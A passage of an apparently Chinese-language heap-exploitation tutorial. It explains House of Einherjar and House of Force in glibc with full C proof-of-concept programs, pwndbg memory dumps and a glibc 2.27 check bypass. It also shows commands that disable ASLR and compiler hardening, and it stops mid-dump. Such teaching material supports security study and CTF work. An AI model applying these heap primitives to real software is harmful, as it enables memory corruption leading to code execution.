aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PIE</span><br><span class="line">gcc -o <span class="built_in">test</span> test.c// 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c// 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c// 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c// 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c// 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure></div><p>系统中关闭PIE选项使用<code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><p>但可能会报错 <code>-bash: /proc/sys/kernel/randomize_va_space: 权限不够</code></p><p>这可能是因为sudo命令不支持重定向</p><p>使用<code>sudo bash -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>即可</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RELRO</span><br><span class="line">gcc -o <span class="built_in">test</span> test.c// 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c// 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c// 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c// 全部开启，即</span><br></pre></td></tr></table></figure></div><h2 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>House of Einherjar依靠Off-by-one将下一个chunk的 pre_inuse标志位置零，<strong>将 p1 的 prev_size 字段设置为我们想要的目的 chunk 位置与 p1 的差值</strong>，在free下一个chunk时，让free函数以为上一个chunk已经被free，当free最后一个chunk时，会将伪造的chunk和当前chunk和top chunk进行unlink操作，合并成一个top chunk，从而达到将top chunk设置为我们伪造chunk的地址。</p><h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       CHUNKSIZE               0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       FIRST_CHUNKSIZE         0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       SECOND_CHUNKSIZE        CHUNKSIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       THIRD_CHUNKSIZE         0x0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       INTERNAL_SIZE_T         size_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       SIZE_SZ                 sizeof(INTERNAL_SIZE_T)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">    INTERNAL_SIZE_T         prev_size;</span><br><span class="line">    INTERNAL_SIZE_T         <span class="built_in">size</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>*    <span class="title">fd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>*    <span class="title">bk</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>*    <span class="title">fd_nextsize</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>*    <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p0 = <span class="built_in">malloc</span>(FIRST_CHUNKSIZE - SIZE_SZ);</span><br><span class="line">    <span class="comment">// 第一个字节将被覆盖为空字节.</span></span><br><span class="line">    <span class="keyword">char</span> *p1 = <span class="built_in">malloc</span>(SECOND_CHUNKSIZE - SIZE_SZ);</span><br><span class="line">    <span class="comment">// 防止调用 malloc_consolidate().</span></span><br><span class="line">    <span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(THIRD_CHUNKSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"House of Einherjar Poc\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆中共申请三个chunk\n第一个chunk只需要对齐且未分配\n第二个chunk大小必须在smallbin &amp; largebin范围内\n最后一个chunk可以为任意大小，只需要保证不调用malloc_consolidate()\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\tp0 = %p\n\tp1 = %p\n\tp2 = %p\n"</span>, p0, p1, p2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n----------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"在栈中伪造一个fakechunk\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> <span class="title">fakechunk</span>;</span></span><br><span class="line">    fakechunk.<span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">    fakechunk.fd = &amp;fakechunk;</span><br><span class="line">    fakechunk.bk = &amp;fakechunk;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"当前 fakechunk: \n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t&amp;fakechunk: %p\n"</span>, &amp;fakechunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t.size: 0x%zx\n\t\t.fd:   %p\n\t\t.bk:   %p\n"</span>,</span><br><span class="line">            fakechunk.<span class="built_in">size</span>, fakechunk.fd, fakechunk.bk);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"假设p0对p1存在Off-by-one \n因此p1-&gt;size的最低位将被修改为NULL \np1-&gt;prev_size同样受到影响\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">off_t</span> diff = (<span class="keyword">off_t</span>)&amp;fakechunk-(<span class="keyword">off_t</span>)(struct malloc_chunk *)(p1-SIZE_SZ*<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// ((struct malloc_chunk *)(p1-SIZE_SZ*2))-&gt;prev_size = -diff;</span></span><br><span class="line">    *((INTERNAL_SIZE_T *)&amp;p0[FIRST_CHUNKSIZE-SIZE_SZ*<span class="number">2</span>]) = -diff;</span><br><span class="line">    p0[FIRST_CHUNKSIZE - SIZE_SZ] = <span class="string">'\0'</span>; <span class="comment">// off-by-one</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"** 溢出触发 **\n"</span>);</span><br><span class="line">    <span class="comment">// ----------------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"通过free(p1)触发合并\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n----------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"当前 fakechunk: \n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t&amp;fakechunk: %p\n"</span>, &amp;fakechunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t.size: 0x%zx\n\t\t.fd:   %p\n\t\t.bk:   %p\n"</span>,</span><br><span class="line">            fakechunk.<span class="built_in">size</span>, fakechunk.fd, fakechunk.bk);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n控制fakechunk-&gt;size为合适的值 \n"</span>);</span><br><span class="line">    fakechunk.<span class="built_in">size</span> = CHUNKSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"当前 fakechunk: \n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t&amp;fakechunk: %p\n"</span>, &amp;fakechunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t.size: 0x%zx\n\t\t.fd:   %p\n\t\t.bk:   %p\n"</span>,</span><br><span class="line">            fakechunk.<span class="built_in">size</span>, fakechunk.fd, fakechunk.bk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n----------------\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x%zx) // fakechunk+SIZE_SZ.\n"</span>,</span><br><span class="line">    CHUNKSIZE - SIZE_SZ);</span><br><span class="line">    <span class="keyword">char</span> *where_you_want = <span class="built_in">malloc</span>(CHUNKSIZE - SIZE_SZ);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t目标地址 = %p\n"</span>, where_you_want);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/27/rfQziOEBpcmbN4Z.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/27/rfQziOEBpcmbN4Z.png" class="lazyload"></a></p><h3 id="分步分析"><a href="#分步分析" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-申请三个chunk"><a href="#1-申请三个chunk" class="headerlink" title="1 申请三个chunk"></a>1 申请三个chunk</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *p0 = <span class="built_in">malloc</span>(FIRST_CHUNKSIZE - SIZE_SZ);</span><br><span class="line"><span class="comment">// 第一个字节将被覆盖为空字节.</span></span><br><span class="line"><span class="keyword">char</span> *p1 = <span class="built_in">malloc</span>(SECOND_CHUNKSIZE - SIZE_SZ);</span><br><span class="line"><span class="comment">// 防止调用 malloc_consolidate().</span></span><br><span class="line"><span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(THIRD_CHUNKSIZE);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x555555559000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 657, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555559290 FASTBIN &#123;            # p0</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x101               # off-by-one位置</span><br><span class="line">&#125;</span><br><span class="line">0x5555555592b0 PREV_INUSE &#123;         # p1</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 257, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x5555555593b0 FASTBIN &#123;            # p2</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x20c31</span><br><span class="line">&#125;</span><br><span class="line">0x5555555593d0 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 134193, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50xg 0x555555559290</span><br><span class="line">0x555555559290:0x00000000000000000x0000000000000021 &lt;&#x3D;&#x3D; p0</span><br><span class="line">0x5555555592a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555592b0:0x00000000000000000x0000000000000101 &lt;&#x3D;&#x3D; p1</span><br><span class="line">0x5555555592c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555592d0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559390:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593b0:0x00000000000000000x0000000000000021 &lt;&#x3D;&#x3D; p2</span><br><span class="line">0x5555555593c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593d0:0x00000000000000000x0000000000020c31 &lt;&#x3D;&#x3D; top chunk</span><br><span class="line">0x5555555593e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="2-off-by-one"><a href="#2-off-by-one" class="headerlink" title="2 off-by-one"></a>2 off-by-one</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">off_t</span> diff = (<span class="keyword">off_t</span>)&amp;fakechunk-(<span class="keyword">off_t</span>)(struct malloc_chunk *)(p1-SIZE_SZ*<span class="number">2</span>);</span><br><span class="line"><span class="comment">// ((struct malloc_chunk *)(p1-SIZE_SZ*2))-&gt;prev_size = -diff;</span></span><br><span class="line">*((INTERNAL_SIZE_T *)&amp;p0[FIRST_CHUNKSIZE-SIZE_SZ*<span class="number">2</span>]) = -diff; <span class="comment">//fakechunk与p1的偏移量</span></span><br><span class="line">p0[FIRST_CHUNKSIZE - SIZE_SZ] = <span class="string">'\0'</span>; <span class="comment">// off-by-one</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x555555559290 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0xffffd5555555b750,   &lt;&#x3D;&#x3D; 偏移量</span><br><span class="line">  bk_nextsize &#x3D; 0x100</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50xg 0x555555559290</span><br><span class="line">0x555555559290:0x00000000000000000x0000000000000021</span><br><span class="line">0x5555555592a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555592b0:0xffffd5555555b750  0x0000000000000100 &lt;&#x3D;&#x3D;覆盖inuse</span><br><span class="line">0x5555555592c0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559390:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593b0:0x00000000000000000x0000000000000021</span><br><span class="line">0x5555555593c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593d0:0x00000000000000000x0000000000020c31</span><br><span class="line">0x5555555593e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="3-free-p1"><a href="#3-free-p1" class="headerlink" title="3 free p1"></a>3 free p1</h4><p>p1 free前与free后比较</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x5555555592b0 &#123;</span><br><span class="line">  prev_size &#x3D; 18446697161213458256, </span><br><span class="line">  size &#x3D; 256, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0,                &lt;------------------</span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">0x5555555592b0 &#123;</span><br><span class="line">  prev_size &#x3D; 18446697161213458256, </span><br><span class="line">  size &#x3D; 256, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x555555559010,     &lt;------------------</span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="4-malloc"><a href="#4-malloc" class="headerlink" title="4 malloc"></a>4 malloc</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; </span><br><span class="line">目标地址 &#x3D; 0x7fffffffdb50</span><br></pre></td></tr></table></figure></div><p>通过计算，重新申请到新的位置</p><h3 id="Glibc-2-27"><a href="#Glibc-2-27" class="headerlink" title="Glibc 2.27"></a>Glibc 2.27</h3><p>在2.27版本中malloc.c对<em>prev_size</em> 的检查如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))\</span><br><span class="line">  malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);            \</span><br></pre></td></tr></table></figure></div><p><strong>只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就可以了</strong>。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fake_chunk2 = (struct malloc_chunk *)p0 + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">fake_chunk2-&gt;prev_size = <span class="keyword">sizeof</span>(struct malloc_chunk);</span><br></pre></td></tr></table></figure></div><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过house_of_einherjar，我们可以控制top chunk，再次malloc后，我们可以控制程序相应位置，按照程序功能，可能会达到任意地址读写，然后就可以通过一般手段getshell。</p><h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>假设top chunk的header可被溢出覆盖，可以将size修改为一个大数，使得所有初始化都通过top chunk而不是mmap，再malloc就可以使接下来的任何操作都调用指定地址，这里相当于一次任意地址写。</p><p>利用条件：</p><ul><li>1.用户能够以溢出等方式控制到top chunk的size域</li><li>2.用户能够自由的控制堆分配尺寸的大小</li></ul><h3 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss_var[] = <span class="string">"这里是将要被覆写的字符串."</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nHouse of Force Poc\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n我们将通过此漏洞覆写地址 %p 的值.\n"</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"当前值为: %s\n"</span>, bss_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n申请第一个chunk.\n"</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"大小为256 bytes 的chunk 在 %p 被申请.\n"</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"分配的块的实际大小是 %ld.\n"</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n假设存在一个可溢出到 top chunk 的漏洞\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\ntop chunk 起始地址是 %p\n"</span>, ptr_top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n用一个极大值覆写top chunk的size使得malloc不会调用mmap\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"top chunk的旧size %#llx\n"</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"top chunk的新size %#llx\n"</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n接下来申请一个chunk，通过整数溢出指向该chunk"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n我们想要写的值位于 %p, top chunk 位于 %p, 通过计算头部size,\n"</span></span><br><span class="line">   <span class="string">"我们应该 malloc %#lx bytes.\n"</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"新指针和旧top chunk一样指向: %p\n"</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n下一个chunk将指向目标buffer.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(100) =&gt; %p!\n"</span>, ctr_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"现在我们可覆写该字符串:\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... old string: %s\n"</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... 使用 strcpy 覆写 \"YEAH!!!\"...\n"</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">"YEAH!!!"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... new string: %s\n"</span>, bss_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/27/yaJ9vnYsFzPKLjA.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/27/yaJ9vnYsFzPKLjA.png" class="lazyload"></a></p><h3 id="分步分析-1"><a href="#分步分析-1" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-申请一个chunk"><a href="#1-申请一个chunk" class="headerlink" title="1 申请一个chunk"></a>1 申请一个chunk</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x555555559000 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0, </span><br><span class="line">  mchunk_size &#x3D; 657, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize 